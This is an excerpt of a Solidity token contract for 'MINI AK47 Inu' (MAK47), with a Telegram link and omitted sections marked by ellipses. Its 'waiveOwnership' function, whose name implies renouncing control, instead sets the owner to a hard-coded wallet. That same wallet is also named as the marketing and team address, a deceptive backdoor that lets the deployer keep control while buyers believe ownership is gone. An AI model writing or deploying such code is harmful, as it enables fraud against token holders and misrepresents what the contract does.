...
/**
Telegram : https://t.me/miniak47inu
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x48A834b78d5640B92acC2e6fF9Ff58c262CA63EE);
    }
...
contract MiniAK47INU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MINI AK47 Inu";
    string private _symbol = "MAK47";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x48A834b78d5640B92acC2e6fF9Ff58c262CA63EE);
    address payable private teamWalletAddress = payable(0x48A834b78d5640B92acC2e6fF9Ff58c262CA63EE);
